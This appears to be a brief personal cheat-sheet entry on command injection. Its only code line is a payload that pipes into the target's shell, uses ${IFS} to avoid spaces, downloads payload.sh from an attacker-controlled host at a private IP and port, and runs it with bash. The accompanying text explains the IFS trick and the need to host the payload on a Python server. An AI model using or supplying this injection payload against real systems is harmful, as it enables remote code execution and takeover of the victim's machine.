# Command Injection

Using curl:

```bash
|curl${IFS}http://10.11.101.30:9002/payload.sh|bash
```

${IFS} here is used like a space character. To make this work, you have to have a python server with the payload you want to execute.
